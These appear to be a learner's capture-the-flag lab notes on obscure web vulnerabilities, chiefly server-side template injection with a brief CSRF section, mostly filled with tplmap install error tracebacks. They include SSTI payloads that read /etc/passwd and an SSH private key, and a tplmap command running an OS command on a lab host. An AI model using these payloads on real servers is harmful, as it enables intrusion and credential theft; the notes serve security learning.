# ZTH: Obscure Web Vulns
# Data: 03.10.2020, 04.10.2020

IP:`10.10.219.86`, `10.10.52.86`
-------------------


## SSTI - Server Side Template Injection
IP:`10.10.219.86`, `10.10.52.86`

>usually you can test for SSTI using {{2+2}} as a test

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection

{{config.__class__.__init__.__globals__['os'].popen(cat /etc/passwd).read()}}

{{ ''.__class__.__mro__[2].__subclasses__()[40]()('/home/test/.ssh/id_rsa').read()}}


---
tplmap - Template mapper

./tplmap.py -u http://10.10.10.10:5000/ -d 'noot' --os-cmd "cat /etc/passwd"

---
test

error with tplmap :(
///
$pip3 install -r requirements.txt 
Collecting PyYAML==5.1.2
  Using cached PyYAML-5.1.2.tar.gz (265 kB)
Collecting certifi==2018.10.15
  Using cached certifi-2018.10.15-py2.py3-none-any.whl (146 kB)
Requirement already satisfied: chardet==3.0.4 in /usr/lib/python3/dist-packages (from -r requirements.txt (line 3)) (3.0.4)
Collecting idna==2.8
  Using cached idna-2.8-py2.py3-none-any.whl (58 kB)
Collecting requests==2.22.0
  Using cached requests-2.22.0-py2.py3-none-any.whl (57 kB)
Collecting urllib3==1.24.1
  Using cached urllib3-1.24.1-py2.py3-none-any.whl (118 kB)
Collecting wsgiref==0.1.2
  Using cached wsgiref-0.1.2.zip (37 kB)
    ERROR: Command errored out with exit status 1:
     command: /usr/bin/python3 -c 'import sys, setuptools, tokenize; sys.argv[0] = '"'"'/tmp/pip-install-cn_q89to/wsgiref/setup.py'"'"'; __file__='"'"'/tmp/pip-install-cn_q89to/wsgiref/setup.py'"'"';f=getattr(tokenize, '"'"'open'"'"', open)(__file__);code=f.read().replace('"'"'\r\n'"'"', '"'"'\n'"'"');f.close();exec(compile(code, __file__, '"'"'exec'"'"'))' egg_info --egg-base /tmp/pip-pip-egg-info-ih5e3n8_                                                                                                    
         cwd: /tmp/pip-install-cn_q89to/wsgiref/                                                      
    Complete output (8 lines):                                                                        
    Traceback (most recent call last):                                                                
      File "<string>", line 1, in <module>                                                            
      File "/tmp/pip-install-cn_q89to/wsgiref/setup.py", line 5, in <module>                          
        import ez_setup                                                                               
      File "/tmp/pip-install-cn_q89to/wsgiref/ez_setup/__init__.py", line 170                         
        print "Setuptools version",version,"or greater has been installed."                           
              ^                                                                                       
    SyntaxError: Missing parentheses in call to 'print'. Did you mean print("Setuptools version",version,"or greater has been installed.")?                                                                 
    ----------------------------------------                                                          
ERROR: Command errored out with exit status 1: python setup.py egg_info Check the logs for full command output.   

----

$./tplmap.py -u http://10.10.52.86 -d 'name' --os-cmd 'cat /etc/passwd'
Traceback (most recent call last):
  File "./tplmap.py", line 3, in <module>
    from core import checks
  File "/opt/tplmap/core/checks.py", line 1, in <module>
    from plugins.engines.mako import Mako
  File "/opt/tplmap/plugins/engines/mako.py", line 1, in <module>
    from plugins.languages import python
  File "/opt/tplmap/plugins/languages/python.py", line 2, in <module>
    from core.plugin import Plugin
  File "/opt/tplmap/core/plugin.py", line 3, in <module>
    from utils.loggers import log
  File "/opt/tplmap/utils/loggers.py", line 4, in <module>
    import utils.config
  File "/opt/tplmap/utils/config.py", line 3, in <module>
    import yaml
ImportError: No module named yaml

///

luckly i found flag online ...


## CSRF - Cross Site Request Forgery
IP:``

install xsrfprobe: `pip3 install xsrfprobe`
to run: `/home/$USER$/.local/bin/xsrfprobe`




